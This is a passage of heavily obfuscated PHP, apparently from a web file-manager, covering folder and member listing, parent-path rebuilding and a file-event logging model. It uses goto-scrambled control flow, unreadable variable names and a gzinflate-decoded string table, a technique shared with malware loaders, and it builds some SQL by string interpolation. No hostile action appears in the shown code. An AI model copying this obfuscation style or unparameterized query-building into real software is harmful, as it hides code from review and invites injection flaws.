$B—–çÌ˜ß’[298])) { $b§Ó¶Ğ›Ö× = $this->_searchFromMeta($B—–çÌ˜ß’[396], $Dé‹‘¦¢“©, 10); $FÕµÙõÒ»ë = $this->_searchFromMeta($B—–çÌ˜ß’[395], $Dé‹‘¦¢“©, 10); $a‹Ûµ…¬³¢ = array_merge($b§Ó¶Ğ›Ö×, $FÕµÙõÒ»ë, $DƒÃé°Ø‚Å[$B—–çÌ˜ß’[345]]); $DƒÃé°Ø‚Å[$B—–çÌ˜ß’[345]] = array_unique_by_key($a‹Ûµ…¬³¢, $B—–çÌ˜ß’[1516]); $DƒÃé°Ø‚Å[$B—–çÌ˜ß’[342]][$B—–çÌ˜ß’[343]] = count($DƒÃé°Ø‚Å[$B—–çÌ˜ß’[345]]); $DƒÃé°Ø‚Å[$B—–çÌ˜ß’[342]][$B—–çÌ˜ß’[344]] = ceil($DƒÃé°Ø‚Å[$B—–çÌ˜ß’[342]][$B—–çÌ˜ß’[343]] / $DƒÃé°Ø‚Å[$B—–çÌ˜ß’[342]][$B—–çÌ˜ß’[340]]); } goto eÉäÎ½•Š; D¾„¸”®Î: } private function _searchFromMeta($AÌ·Ë³½Ñ, $c•Å‡­•Œä, $f‚×Ìù¬÷–) { goto F®‡ì ¤ùÅ; f×µ¯¹Ôóî: $EëÅ“„Ú˜Å = Model($Fè™¡á‰ö[1609])->where($CØçƒîó‹¾)->limit($f‚×Ìù¬÷–)->select(); if (!$EëÅ“„Ú˜Å) { return array(); } $EëÅ“„Ú˜Å = array_to_keyvalue($EëÅ“„Ú˜Å, $Fè™¡á‰ö[33], $Fè™¡á‰ö[1516]); goto f™êÇ²‰¢¬; f™êÇ²‰¢¬: $eÎµ¬êÏË¥ = $this->where(array($Fè™¡á‰ö[1598] => array($Fè™¡á‰ö[7], $EëÅ“„Ú˜Å)))->select(); if (!$eÎµ¬êÏË¥) { return array(); } return $eÎµ¬êÏË¥; goto F‚Ç³Øà°‚; F®‡ì ¤ùÅ: $Fè™¡á‰ö =& $_SERVER[ÍÓÖ€°å]; $c•Å‡­•Œä = strtolower($c•Å‡­•Œä); $CØçƒîó‹¾ = array($Fè™¡á‰ö[88] => $AÌ·Ë³½Ñ, $Fè™¡á‰ö[348] => array($Fè™¡á‰ö[511], "\45{$c•Å‡­•Œä}\45")); goto f×µ¯¹Ôóî; F‚Ç³Øà°‚: } protected function _listDataApplyItem($a•À‘Œ‚) { $fÉ£åæø· = array($a•À‘Œ‚); $this->_listDataApply($fÉ£åæø·); return $fÉ£åæø·[0]; } protected function _listDataApply(&$Cåàš½ñÊÄ) { goto A¢èÌî¢‡®; bøâÇÌä¸ï: $this->_listAppendChildren($Cåàš½ñÊÄ); $this->_listAppendChildrenMember($Cåàš½ñÊÄ); $this->_listAppendMeta($Cåàš½ñÊÄ, $bŠŸë¬áŠ†); goto E¬„Û¥—ã; E¬„Û¥—ã: $this->_listAppendParent($Cåàš½ñÊÄ); $this->_listAppendSourceRoot($Cåàš½ñÊÄ, $bŠŸë¬áŠ†); goto cİ‚¥›ÏÚ²; A¢èÌî¢‡®: $FÏƒõÃ‡ø® =& $_SERVER[ÍÓÖ€°å]; if (!$Cåàš½ñÊÄ) { return; } $bŠŸë¬áŠ† = array_to_keyvalue($Cåàš½ñÊÄ, $FÏƒõÃ‡ø®[33], $FÏƒõÃ‡ø®[1516]); goto bøâÇÌä¸ï; cİ‚¥›ÏÚ²: } private function _listAppendChildren(&$Añ©›ãÎß—) { goto f«Ü§Ø¡æŞ; C†ë”®£­£: $c‘™—Ó„â‚ = count($Añ©›ãÎß—); $Aìö­àâƒ¸ = $this->tablePrefix . $this->tableName; for ($c«ùÙÄ‚¿ = 0, $D÷ñ³™Œ¶â = 0; $c«ùÙÄ‚¿ < $c‘™—Ó„â‚; $c«ùÙÄ‚¿++) { $D÷ñ³™Œ¶â++; $bç‡‰§„¨ = $Añ©›ãÎß—[$c«ùÙÄ‚¿][$c–®‚¬•’[1516]]; $AíÄ¼ˆĞ–¸ .= "\x53\x45\114\105\x43\124\40\52\x20\106\x52\117\115\x20\x28\123\x45\114\105\103\x54\x20\x27{$bç‡‰§„¨}\x5f\143\150\x69\154\144\x27\40\141\163\x20\150\x61\x73\x20\x46\x52\x4f\115\x20\x60{$Aìö­àâƒ¸}\140\x20\167\x68\145\162\145\40\160\x61\162\145\x6e\164\x49\104\75{$bç‡‰§„¨}\40\154\151\155\151\164\x20\61\x29\40\x61\163\40\x74\x62\x5f{$bç‡‰§„¨}\x20\165\156\151\157\x6e\40\x61\x6c\x6c\x20"; if (($D÷ñ³™Œ¶â >= 20 || $c«ùÙÄ‚¿ == $c‘™—Ó„â‚ - 1) && $AíÄ¼ˆĞ–¸) { $AíÄ¼ˆĞ–¸ = substr($AíÄ¼ˆĞ–¸, 0, -strlen($c–®‚¬•’[1610])); $FŞÜ­í¾è = $this->query($AíÄ¼ˆĞ–¸); $D§î£ïÛğ½ = array_merge($D§î£ïÛğ½, $FŞÜ­í¾è); $D÷ñ³™Œ¶â = 0; $AíÄ¼ˆĞ–¸ = $c–®‚¬•’[33]; } } goto C«ŠœÉ…Ò‘; f«Ü§Ø¡æŞ: $c–®‚¬•’ =& $_SERVER[ÍÓÖ€°å]; $AíÄ¼ˆĞ–¸ = $c–®‚¬•’[352]; $D§î£ïÛğ½ = array(); goto C†ë”®£­£; C«ŠœÉ…Ò‘: $D§î£ïÛğ½ = array_to_keyvalue($D§î£ïÛğ½, $c–®‚¬•’[1611]); foreach ($Añ©›ãÎß— as &$AÚ¶ß®ŞÜ™) { $AÚ¶ß®ŞÜ™[$c–®‚¬•’[1612]] = isset($D§î£ïÛğ½[$AÚ¶ß®ŞÜ™[$c–®‚¬•’[1516]] . $c–®‚¬•’[1613]]); } goto BŸˆÉëÅŠ»; BŸˆÉëÅŠ»: } private function _listAppendChildrenMember(&$có”ì®ë½Ø) { goto aÔ³š¥à ²; aÔ³š¥à ²: $dâöÇÌ´ø =& $_SERVER[ÍÓÖ€°å]; $b§™¨’œ£² = $dâöÇÌ´ø[352]; $Dòã´Õ„Å§ = array(); goto bĞö¸ÌĞ†; Dïø³È„Á: $Dòã´Õ„Å§ = array_to_keyvalue($Dòã´Õ„Å§, $dâöÇÌ´ø[1611]); foreach ($có”ì®ë½Ø as &$f¡ïèŒì¾¢) { $f¡ïèŒì¾¢[$dâöÇÌ´ø[1614]] = isset($Dòã´Õ„Å§[$f¡ïèŒì¾¢[$dâöÇÌ´ø[1516]] . $dâöÇÌ´ø[1613]]); } goto Fó©ªÃ»¢; bĞö¸ÌĞ†: $cšò‚í¦Š = count($có”ì®ë½Ø); $fˆĞºÚ»ÙÚ = $this->tablePrefix . $dâöÇÌ´ø[1600]; for ($a¦…¿¤Ëó» = 0, $f£Â¶ïØÚ• = 0; $a¦…¿¤Ëó» < $cšò‚í¦Š; $a¦…¿¤Ëó»++) { $f£Â¶ïØÚ•++; $A¾Úöá = $có”ì®ë½Ø[$a¦…¿¤Ëó»][$dâöÇÌ´ø[1516]]; $b§™¨’œ£² .= "\x53\x45\x4c\105\103\124\x20\52\x20\x46\122\117\x4d\40\x28\123\105\114\105\x43\x54\x20\47{$A¾Úöá}\137\143\x68\x69\x6c\x64\x27\40\x61\163\x20\x68\141\163\40\x46\122\117\x4d\40\x60{$fˆĞºÚ»ÙÚ}\140\40\167\x68\145\x72\145\40\x67\x72\x6f\165\160\x49\x44\75{$A¾Úöá}\40\x6c\151\x6d\151\164\x20\61\51\40\141\x73\x20\164\x62\137{$A¾Úöá}\x20\x75\156\151\157\x6e\x20\x61\x6c\x6c\x20"; if (($f£Â¶ïØÚ• >= 20 || $a¦…¿¤Ëó» == $cšò‚í¦Š - 1) && $b§™¨’œ£²) { $b§™¨’œ£² = substr($b§™¨’œ£², 0, -strlen($dâöÇÌ´ø[1610])); $CÔ£À“†˜â = $this->query($b§™¨’œ£²); $Dòã´Õ„Å§ = array_merge($Dòã´Õ„Å§, $CÔ£À“†˜â); $f£Â¶ïØÚ• = 0; $b§™¨’œ£² = $dâöÇÌ´ø[33]; } } goto Dïø³È„Á; Fó©ªÃ»¢: } private function _listAppendMeta(&$bæÈÖÊ£‡ô, $d²ìò‡ÃÂ¥) { $EÑôÜ¡‘ í =& $_SERVER[ÍÓÖ€°å]; $DÅå¹Ÿ•² = array($EÑôÜ¡‘ í[1516] => array($EÑôÜ¡‘ í[7], $d²ìò‡ÃÂ¥)); $cÂğ³ÂŒ² = Model($EÑôÜ¡‘ í[1599])->where($DÅå¹Ÿ•²)->select(); $cÂğ³ÂŒ² = array_to_keyvalue_group($cÂğ³ÂŒ², $EÑôÜ¡‘ í[1516]); foreach ($cÂğ³ÂŒ² as &$b‘‡Ü³Ü£) { $b‘‡Ü³Ü£ = array_to_keyvalue($b‘‡Ü³Ü£, $EÑôÜ¡‘ í[88], $EÑôÜ¡‘ í[348]); } foreach ($bæÈÖÊ£‡ô as &$DÁÍÀÖâ ‡) { $DÁÍÀÖâ ‡[$EÑôÜ¡‘ í[1562]] = array(); if (isset($cÂğ³ÂŒ²[$DÁÍÀÖâ ‡[$EÑôÜ¡‘ í[1516]]])) { $DÁÍÀÖâ ‡[$EÑôÜ¡‘ í[1562]] = $cÂğ³ÂŒ²[$DÁÍÀÖâ ‡[$EÑôÜ¡‘ í[1516]]]; } } } protected function parentLevelArray($b‰‚¥‚…í³) { $b×ÊäÜòÀš =& $_SERVER[ÍÓÖ€°å]; $b‰‚¥‚…í³ = explode($b×ÊäÜòÀš[47], trim($b‰‚¥‚…í³, $b×ÊäÜòÀš[47])); $b‰‚¥‚…í³ = array_remove_value($b‰‚¥‚…í³, $b×ÊäÜòÀš[393]); return $b‰‚¥‚…í³; } private function _listAppendParent(&$FõŠ×‘”ğ ) { goto A„Çæ©˜«; A„Çæ©˜«: $e”á—•—èø =& $_SERVER[ÍÓÖ€°å]; $E”™†õÃÚÒ = array(); foreach ($FõŠ×‘”ğ  as &$BØ¬é£‹è) { $E”™†õÃÚÒ[$BØ¬é£‹è[$e”á—•—èø[1516]]] = $BØ¬é£‹è[$e”á—•—èø[28]]; $e²ßğŞÄ¼¶ = $this->parentLevelArray($BØ¬é£‹è[$e”á—•—èø[364]]); foreach ($e²ßğŞÄ¼¶ as $a‰Œ·ÏÂ ë) { if (!isset($E”™†õÃÚÒ[$a‰Œ·ÏÂ ë])) { $E”™†õÃÚÒ[$a‰Œ·ÏÂ ë] = 0; } } } goto Aº¤‰•Š¯™; Aº¤‰•Š¯™: $BÎ¯Ã„à = array(); foreach ($E”™†õÃÚÒ as $d÷…ŒÇë => $eÍêËÉŒìæ) { if (!$eÍêËÉŒìæ) { $BÎ¯Ã„à[] = $d÷…ŒÇë; } } if ($BÎ¯Ã„à) { $D¹äÓÓ°èÊ = array($e”á—•—èø[1598] => array($e”á—•—èø[946], $BÎ¯Ã„à)); $CÜÛÄï½íª = $this->field($e”á—•—èø[1615])->where($D¹äÓÓ°èÊ)->select(); $e±„«æÌ  = array_to_keyvalue($CÜÛÄï½íª, $e”á—•—èø[1516], $e”á—•—èø[28]); $E”™†õÃÚÒ = array_merge_index($E”™†õÃÚÒ, $e±„«æÌ ); } goto aó“ÙÏ½; aó“ÙÏ½: foreach ($FõŠ×‘”ğ  as &$BØ¬é£‹è) { $e²ßğŞÄ¼¶ = $this->parentLevelArray($BØ¬é£‹è[$e”á—•—èø[364]]); $bÓ¬õ‘Í–ä = $e”á—•—èø[33]; foreach ($e²ßğŞÄ¼¶ as $a‰Œ·ÏÂ ë) { $bÓ¬õ‘Í–ä .= $E”™†õÃÚÒ[$a‰Œ·ÏÂ ë] . $e”á—•—èø[8]; } if ($e²ßğŞÄ¼¶) { $bÓ¬õ‘Í–ä .= $BØ¬é£‹è[$e”á—•—èø[28]]; } $BØ¬é£‹è[$e”á—•—èø[1616]] = str_replace($e”á—•—èø[1296], $e”á—•—èø[8], $bÓ¬õ‘Í–ä); } goto eŞõ°åãÈ…; eŞõ°åãÈ…: } private function _listAppendSourceRoot(&$E–¶ÍÓÛ¬, $eŞ‚ŒÃ„óò) { $CÒ¯êöïÎŒ =& $_SERVER[ÍÓÖ€°å]; $Cˆ”ó„ÅÈŒ = array($CÒ¯êöïÎŒ[384] => SourceModel::TYPE_GROUP, $CÒ¯êöïÎŒ[375] => 0, $CÒ¯êöïÎŒ[386] => array($CÒ¯êöïÎŒ[7], $eŞ‚ŒÃ„óò)); $døÊó”º½æ = Model($CÒ¯êöïÎŒ[512])->field($CÒ¯êöïÎŒ[1617])->where($Cˆ”ó„ÅÈŒ)->select(); $døÊó”º½æ = array_to_keyvalue($døÊó”º½æ, $CÒ¯êöïÎŒ[386]); $døÊó”º½æ = array_remove_key($døÊó”º½æ, $CÒ¯êöïÎŒ[386]); foreach ($E–¶ÍÓÛ¬ as &$A¥¹œ¯ßÂà) { $A¥¹œ¯ßÂà[$CÒ¯êöïÎŒ[1618]] = $døÊó”º½æ[$A¥¹œ¯ßÂà[$CÒ¯êöïÎŒ[1516]]] ? $døÊó”º½æ[$A¥¹œ¯ßÂà[$CÒ¯êöïÎŒ[1516]]] : array(); } } protected function resetParentLevel() { $C·…ÛÊ¢ÎŒ =& $_SERVER[ÍÓÖ€°å]; $fá‚ô²Í = $C·…ÛÊ¢ÎŒ[1516]; $aŒ’ù£²©ö = $this->select(); $aŒ’ù£²©ö = array_to_keyvalue($aŒ’ù£²©ö, $fá‚ô²Í); foreach ($aŒ’ù£²©ö as $d¿´ğ–Û—ì) { goto Cê¶Ïê ò; Cê¶Ïê ò: $Eà†ƒœ¸É‰ = $d¿´ğ–Û—ì; $a¢¿ºøßê‡ = array(); while ($Eà†ƒœ¸É‰[$C·…ÛÊ¢ÎŒ[375]] != 0) { $a¢¿ºøßê‡[] = $Eà†ƒœ¸É‰[$C·…ÛÊ¢ÎŒ[375]]; $Eà†ƒœ¸É‰ = $aŒ’ù£²©ö[$Eà†ƒœ¸É‰[$C·…ÛÊ¢ÎŒ[375]]]; } goto e‰°â–ï«¸; e‰°â–ï«¸: $a¢¿ºøßê‡[] = 0; $a¢¿ºøßê‡ = $C·…ÛÊ¢ÎŒ[47] . implode($C·…ÛÊ¢ÎŒ[47], array_reverse($a¢¿ºøßê‡)) . $C·…ÛÊ¢ÎŒ[47]; $this->setNamePinyin($d¿´ğ–Û—ì[$fá‚ô²Í], $d¿´ğ–Û—ì[$C·…ÛÊ¢ÎŒ[28]]); goto dŸÕ Ú½Ì¹; dŸÕ Ú½Ì¹: $this->where(array($fá‚ô²Í => $d¿´ğ–Û—ì[$fá‚ô²Í]))->save(array($C·…ÛÊ¢ÎŒ[390] => $a¢¿ºøßê‡)); goto dí¢¹½æ ; dí¢¹½æ : } return $aŒ’ù£²©ö; } public function groupNameAuto($dëà‘… ğ, $BÃÃìŒ È–) { $EæéæÀìõÂ =& $_SERVER[ÍÓÖ€°å]; $cãÕ¹À‚Å = $this->where(array($EæéæÀìõÂ[389] => $dëà‘… ğ))->getField($EæéæÀìõÂ[28], !0); if (!$cãÕ¹À‚Å || !in_array($BÃÃìŒ È–, $cãÕ¹À‚Å)) { return $BÃÃìŒ È–; } for ($d”ë…¦ö¡Ö = 1; $d”ë…¦ö¡Ö <= count($cãÕ¹À‚Å) + 1; $d”ë…¦ö¡Ö++) { $fÆË‚–ä†Ÿ = $BÃÃìŒ È– . "\x28{$d”ë…¦ö¡Ö}\x29"; if (!in_array($fÆË‚–ä†Ÿ, $cãÕ¹À‚Å)) { return $fÆË‚–ä†Ÿ; } } } } goto Fã®›ÚÓä; EêâÉ±·¥¥: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\x6f\x75\162\143\145\x5f\145\166\x65\x6e\x74"; protected $dataAuto = array(array("\x63\162\145\x61\x74\x65\x54\x69\155\145", "\164\x69\155\x65", "\x69\156\163\145\x72\x74", "\x66\165\156\143\164\x69\x6f\x6e"), array("\x64\145\163\143", '', "\x69\156\163\x65\162\164\54\x75\160\x64\141\x74\x65\x2c\163\x65\154\145\x63\x74", "\152\163\x6f\156")); public function addEvent($AÎ´ÉÔÇË, $FÄˆŞ»áãÉ, $b“Şœ–İå = '') { goto CÆµÊ†Õ; CÆµÊ†Õ: $BÔ‡Ñ‚ã…æ =& $_SERVER[ÍÓÖ€°å]; $bİ×ƒÉÕ°Ò = Model($BÔ‡Ñ‚ã…æ[827])->sourceInfo($AÎ´ÉÔÇË); if (!$bİ×ƒÉÕ°Ò) { return !1; } goto b¯¾÷åª; aÀÀÊÓ¦§: return $this->add($dÌŸ¾Ç‘ƒ®); goto eñ©ë¹Ó‘‚; b¯¾÷åª: if ($b“Şœ–İå && is_string($b“Şœ–İå)) { $b“Şœ–İå = array($BÔ‡Ñ‚ã…æ[1547] => $b“Şœ–İå); } $dÌŸ¾Ç‘ƒ® = array($BÔ‡Ñ‚ã…æ[406] => $AÎ´ÉÔÇË, $BÔ‡Ñ‚ã…æ[1680] => $bİ×ƒÉÕ°Ò[$BÔ‡Ñ‚ã…æ[375]], $BÔ‡Ñ‚ã…æ[1053] => USER_ID, $BÔ‡Ñ‚ã…æ[787] => $FÄˆŞ»áãÉ, $BÔ‡Ñ‚ã…æ[1055] => $b“Şœ–İå); $this->addSystemLog($FÄˆŞ»áãÉ, $dÌŸ¾Ç‘ƒ®); goto aÀÀÊÓ¦§; eñ©ë¹Ó‘‚: } private function addSystemLog($fÓ‰İß˜÷, $Bì×–³£õÑ) { $c¶‚ãËÊŸ¥ =& $_SERVER[ÍÓÖ€°å]; if ($fÓ‰İß˜÷ == $c¶‚ãËÊŸ¥[1681]) { $fÓ‰İß˜÷ = $Bì×–³£õÑ[$c¶‚ãËÊŸ¥[1560]][$c¶‚ãËÊŸ¥[1682]]; } else { if (in_array($fÓ‰İß˜÷, array($c¶‚ãËÊŸ¥[1493], $c¶‚ãËÊŸ¥[1683]))) { $fÓ‰İß˜÷ = $Bì×–³£õÑ[$c¶‚ãËÊŸ¥[1560]][$c¶‚ãËÊŸ¥[440]]; } } $A“ê‡Ú±ñ“ = array_merge($Bì×–³£õÑ, array($c¶‚ãËÊŸ¥[1684] => $Bì×–³£õÑ[$c¶‚ãËÊŸ¥[365]], $c¶‚ãËÊŸ¥[1685] => $Bì×–³£õÑ[$c¶‚ãËÊŸ¥[1685]])); Model($c¶‚ãËÊŸ¥[1458])->addLog($c¶‚ãËÊŸ¥[1686] . $fÓ‰İß˜÷, $A“ê‡Ú±ñ“); } public function eventCreate($a™É‡ÁŠàØ, $dÌ½í×ùØ‘) { $b”—¤»¸œõ =& $_SERVER[ÍÓÖ€°å]; $AÀôµÑòÚ´ = Model($b”—¤»¸œõ[827])->sourceInfo($a™É‡ÁŠàØ); $E–ÅîÉÁ‹¤ = array($b”—¤»¸œõ[1682] => $dÌ½í×ùØ‘, $b”—¤»¸œõ[28] => $AÀôµÑòÚ´[$b”—¤»¸œõ[28]]); return $this->addEvent($a™É‡ÁŠàØ, $b”—¤»¸œõ[1681], $E–ÅîÉÁ‹¤); } public function eventFileEdit($CÊàÜ”İÅ) { return $this->addEvent($CÊàÜ”İÅ, $_SERVER[ÍÓÖ€°å][1485]); } public function eventRecycle($aäÎõõË‚Á, $fÏ˜ƒÈöùÃ) { return $this->addEvent($aäÎõõË‚Á, $_SERVER[ÍÓÖ€°å][1683], $fÏ˜ƒÈöùÃ); } public function eventRemove($d­È¥ãÕ×Œ) { $fî’îßŠ¥Š =& $_SERVER[ÍÓÖ€°å]; $Dë×îË´‚¥ = Model($fî’îßŠ¥Š[827])->sourceInfo($d­È¥ãÕ×Œ); $D¢…ã¬Û‰¥ = $Dë×îË´‚¥[$fî’îßŠ¥Š[28]]; return $this->addEvent($Dë×îË´‚¥[$fî’îßŠ¥Š[375]], $fî’îßŠ¥Š[359], $D¢…ã¬Û‰¥); } public function eventShare($aŠÏ»Õº»”, $A¥Ì¥¬¤¢) { return $this->addEvent($aŠÏ»Õº»”, $_SERVER[ÍÓÖ€°å][1493], $A¥Ì¥¬¤¢); } public function eventMove($eÓµÆ¯ä², $bòÕöĞó, $DÂ“Å°åƒ) { goto Càİ—¯ƒØò; c®œ³©ã¬º: $Aáø¬à’‚ = $BòÚ±÷°Ù->sourceInfo($bòÕöĞó); $dô‹…‰„Œ° = $BòÚ±÷°Ù->sourceInfo($DÂ“Å°åƒ); $EŠÂ‰ÑÊ‘Î = array($F³¸ñÇôŞï[735] => $bòÕöĞó, $F³¸ñÇôŞï[1687] => $Aáø¬à’‚[$F³¸ñÇôŞï[28]], $F³¸ñÇôŞï[736] => $DÂ“Å°åƒ, $F³¸ñÇôŞï[1688] => $dô‹…‰„Œ°[$F³¸ñÇôŞï[28]]); goto eŸí§ÅºŠ; FŒ™ªä…ÚÒ: $this->addEvent($bòÕöĞó, $F³¸ñÇôŞï[1689], $EŠÂ‰ÑÊ‘Î); goto bÄ»£ˆæ’; Càİ—¯ƒØò: $F³¸ñÇôŞï =& $_SERVER[ÍÓÖ€°å]; $BòÚ±÷°Ù = Model($F³¸ñÇôŞï[827]); $C¤§¿ñˆİ¿ = $BòÚ±÷°Ù->sourceInfo($eÓµÆ¯ä²); goto c®œ³©ã¬º; eŸí§ÅºŠ: $this->addEvent($eÓµÆ¯ä², $F³¸ñÇôŞï[729], $EŠÂ‰ÑÊ‘Î); $C¤§¿ñˆİ¿ = $BòÚ±÷°Ù->sourceInfo($eÓµÆ¯ä²); $EŠÂ‰ÑÊ‘Î = array($F³¸ñÇôŞï[365] => $C¤§¿ñˆİ¿[$F³¸ñÇôŞï[365]], $F³¸ñÇôŞï[28] => $C¤§¿ñˆİ¿[$F³¸ñÇôŞï[28]]); goto FŒ™ªä…ÚÒ; bÄ»£ˆæ’: } public function eventCopy($F¡»Ã‰ë÷µ) { $this->eventCreate($F¡»Ã‰ë÷µ, $_SERVER[ÍÓÖ€°å][728]); } public function eventRename($EäóÊ°«—, $eÀ´”Øµ», $fàÒé²‡¬…) { $b¢ÅøÏÒä¥ =& $_SERVER[ÍÓÖ€°å]; $FÙ³Ø“Ü°Ã = array($b¢ÅøÏÒä¥[735] => $eÀ´”Øµ», $b¢ÅøÏÒä¥[736] => $fàÒé²‡¬…); return $this->addEvent($EäóÊ°«—, $b¢ÅøÏÒä¥[1690], $FÙ³Ø“Ü°Ã); } public function eventAddComment($f¸Æ·‹«´š, $e×†ŸŠÔÊ) { return $this->addEvent($f¸Æ·‹«´š, $_SERVER[ÍÓÖ€°å][1691], $e×†ŸŠÔÊ); } public function eventAddDesc($F™†Œš‚—, $c‚òÄÊ’£) { return $this->addEvent($F™†Œš‚—, $_SERVER[ÍÓÖ€°å][1692], $c‚òÄÊ’£); } public function listBySource($cùÅ¹ÜòÒ¤) { goto CÁßÊ«—â; CÁßÊ«—â: $BÊõñâ¶‚ =& $_SERVER[ÍÓÖ€°å]; $D‘Ñß´ª“õ = Model($BÊõñâ¶‚[827])->sourceInfo($cùÅ¹ÜòÒ¤); $eæƒÇ·Ù±Ú = array($BÊõñâ¶‚[406] => $cùÅ¹ÜòÒ¤); goto bĞÓ¹‹É‚¬; bĞÓ¹‹É‚¬: if ($D‘Ñß´ª“õ[$BÊõñâ¶‚[366]] == $BÊõñâ¶‚[367]) { $DÀìÆŞ³À• = Model($BÊõñâ¶‚[827])->listSearchChildren($cùÅ¹ÜòÒ¤, 20000); $DÀìÆŞ³À•[] = $cùÅ¹ÜòÒ¤; $eæƒÇ·Ù±Ú = array($BÊõñâ¶‚[365] => array($BÊõñâ¶‚[7], $DÀìÆŞ³À•)); } $F¼‚œ²Øæ° = $this->where($eæƒÇ·Ù±Ú)->order($BÊõñâ¶‚[1693])->selectPage(); if ($F¼‚œ²Øæ°[$BÊõñâ¶‚[342]][$BÊõñâ¶‚[343]] == 0) { $F¼‚œ²Øæ°[$BÊõñâ¶‚[342]][$BÊõñâ¶‚[343]] = 1; $F¼‚œ²Øæ°[$BÊõñâ¶‚[345]] = array(array($BÊõñâ¶‚[406] => $cùÅ¹ÜòÒ¤, $BÊõñâ¶‚[1680] => $D‘Ñß´ª“õ[$BÊõñâ¶‚[375]], $BÊõñâ¶‚[1053] => $D‘Ñß´ª“õ[$BÊõñâ¶‚[1694]], $BÊõñâ¶‚[787] => $BÊõñâ¶‚[1695], $BÊõñâ¶‚[1557] => $D‘Ñß´ª“õ[$BÊõñâ¶‚[175]], $BÊõñâ¶‚[1055] => $BÊõñâ¶‚[33])); } goto f×ñ½åß; f×ñ½åß: $F¼‚œ²Øæ° = $this->eventListParse($F¼‚œ²Øæ°, $cùÅ¹ÜòÒ¤); show_json($F¼‚œ²Øæ°); goto DŒµ§ÓÇ¯ğ; DŒµ§ÓÇ¯ğ: } private function eventListParse($B’¹ÎœŸÂƒ, $dˆ¥ì†­ò‘) { goto e©Ü²•³À; e©Ü²•³À: $F·áÍËÌ „ =& $_SERVER[ÍÓÖ€°å]; $AÂ–Ü‰ÙÜó = $B’¹ÎœŸÂƒ[$F·áÍËÌ „[345]]; $e…·®ÒÊ„ = array_to_keyvalue($AÂ–Ü‰ÙÜó, $F·áÍËÌ „[33], $F·áÍËÌ „[365]); goto bºÓöè„—; câ’ê³: return $B’¹ÎœŸÂƒ; goto BòÙÆ†½¦Á; AËõ¹ïÕ†: $e…·®ÒÊ„ = array_unique($e…·®ÒÊ„); $CÃ÷ë…½¢ê = array_unique(array_to_keyvalue($AÂ–Ü‰ÙÜó, $F·áÍËÌ „[33], $F·áÍËÌ „[1062])); $cê¤‹•¯è¯ = Model($F·áÍËÌ „[1452])->userListInfo($CÃ÷ë…½¢ê); goto A÷½º«Ş¹; bºÓöè„—: $aÆ‚éÁÑØ„ = array_to_keyvalue($AÂ–Ü‰ÙÜó, $F·áÍËÌ „[33], $F·áÍËÌ „[1685]); foreach ($AÂ–Ü‰ÙÜó as $AÄìÇöÒÑ¦) { $bšÛ«ÛâÓí = $AÄìÇöÒÑ¦[$F·áÍËÌ „[1560]]; if ($AÄìÇöÒÑ¦[$F·áÍËÌ „[29]] == $F·áÍËÌ „[729] && isset($bšÛ«ÛâÓí[$F·áÍËÌ „[735]])) { $e…·®ÒÊ„[] = $bšÛ«ÛâÓí[$F·áÍËÌ „[735]]; $e…·®ÒÊ„[] = $bšÛ«ÛâÓí[$F·áÍËÌ „[736]]; } if ($AÄìÇöÒÑ¦[$F·áÍËÌ „[29]] == $F·áÍËÌ „[1689] && isset($bšÛ«ÛâÓí[$F·áÍËÌ „[365]])) { $e…·®ÒÊ„[] = $bšÛ«ÛâÓí[$F·áÍËÌ „[365]]; } } $e…·®ÒÊ„ = array_merge($e…·®ÒÊ„, $aÆ‚éÁÑØ„, array($dˆ¥ì†­ò‘)); goto AËõ¹ïÕ†; A÷½º«Ş¹: $FØìÕØŒîÓ = Model($F·áÍËÌ „[512])->sourceListInfo($e…·®ÒÊ„, !0); foreach ($AÂ–Ü‰ÙÜó as &$AÄìÇöÒÑ¦) { goto cÊæ÷¼µˆ¢; cÊæ÷¼µˆ¢: $bšÛ«ÛâÓí =& $AÄìÇöÒÑ¦[$F·áÍËÌ „[1560]]; if ($AÄìÇöÒÑ¦[$F·áÍËÌ „[29]] == $F·áÍËÌ „[729] && isset($bšÛ«ÛâÓí[$F·áÍËÌ „[735]])) { $bšÛ«ÛâÓí[$F·áÍËÌ „[735]] = $FØìÕØŒîÓ[$bšÛ«ÛâÓí[$F·áÍËÌ „[735]]]; $bšÛ«ÛâÓí[$F·áÍËÌ „[736]] = $FØìÕØŒîÓ[$bšÛ«ÛâÓí[$F·áÍËÌ „[736]]]; } if ($AÄìÇöÒÑ¦[$F·áÍËÌ „[29]] == $F·áÍËÌ „[1689] && isset($bšÛ«ÛâÓí[$F·áÍËÌ „[365]])) { $bšÛ«ÛâÓí[$F·áÍËÌ „[365]] = $FØìÕØŒîÓ[$bšÛ«ÛâÓí[$F·áÍËÌ „[365]]]; } goto F‡‡Ø…¬£Ï; d‚áÑ¢•‡°: $AÄìÇöÒÑ¦[$F·áÍËÌ „[1655]] = $cê¤‹•¯è¯[$AÄìÇöÒÑ¦[$F·áÍËÌ „[1062]]]; goto Cˆ¯œØßî‰; F‡‡Ø…¬£Ï: $AÄìÇöÒÑ¦[$F·áÍËÌ „[1618]] = $FØìÕØŒîÓ[$AÄìÇöÒÑ¦[$F·áÍËÌ „[365]]]; $AÄìÇöÒÑ¦[$F·áÍËÌ „[1696]] = $FØìÕØŒîÓ[$AÄìÇöÒÑ¦[$F·áÍËÌ „[1685]]]; if ($AÄìÇöÒÑ¦[$F·áÍËÌ „[29]] == $F·áÍËÌ „[359]) { $AÄìÇöÒÑ¦[$F·áÍËÌ „[1696]] = $AÄìÇöÒÑ¦[$F·áÍËÌ „[1618]]; $AÄìÇöÒÑ¦[$F·áÍËÌ „[1685]] = $AÄìÇöÒÑ¦[$F·áÍËÌ „[1696]][$F·áÍËÌ „[365]]; $AÄìÇöÒÑ¦[$F·áÍËÌ „[1618]] = !1; $AÄìÇöÒÑ¦[$F·áÍËÌ „[365]] = $F·áÍËÌ „[33]; } goto d‚áÑ¢•‡°; Cˆ¯œØßî‰: } $B’¹ÎœŸÂƒ[$F·áÍËÌ „[345]] = $AÂ–Ü‰ÙÜó; goto câ’ê³; BòÙÆ†½¦Á: } public function removeBySource($a½ÀÌÛœëé) { $BÒÄ„¾³ = array($_SERVER[ÍÓÖ€°å][406] => $a½ÀÌÛœëé); $this->where($BÒÄ„¾³)->remove(); } } define($_SERVER[ÍÓÖ€°å][1697], $_SERVER[ÍÓÖ€°å][1698]); $_SERVER[î“×] = explode($_SERVER[ÍÓÖ€°å][1699], gzinflate(substr($_SERVER[ÍÓÖ€°å][1700], 10, -8))); goto DÄøÙß¾‡‘; eßÁ°ç ‡…: class UserModel 